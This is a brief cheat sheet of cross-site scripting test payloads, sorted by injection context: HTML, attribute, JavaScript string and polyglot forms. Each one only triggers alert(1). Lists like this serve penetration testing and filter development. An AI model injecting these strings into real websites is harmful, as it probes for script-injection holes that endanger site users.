# Payloads (XSS)

## HTML context
```html
<script>alert(1)</script>
```

## Attribute context
```html
"><img src=x onerror=alert(1)>
```

## JS string context
```js
'-alert(1)-'
";alert(1);//
```

## Polyglots
```
"><svg onload=alert(1)>
</script><script>alert(1)</script>
"><iframe srcdoc='<script>alert(1)</script>'>
```
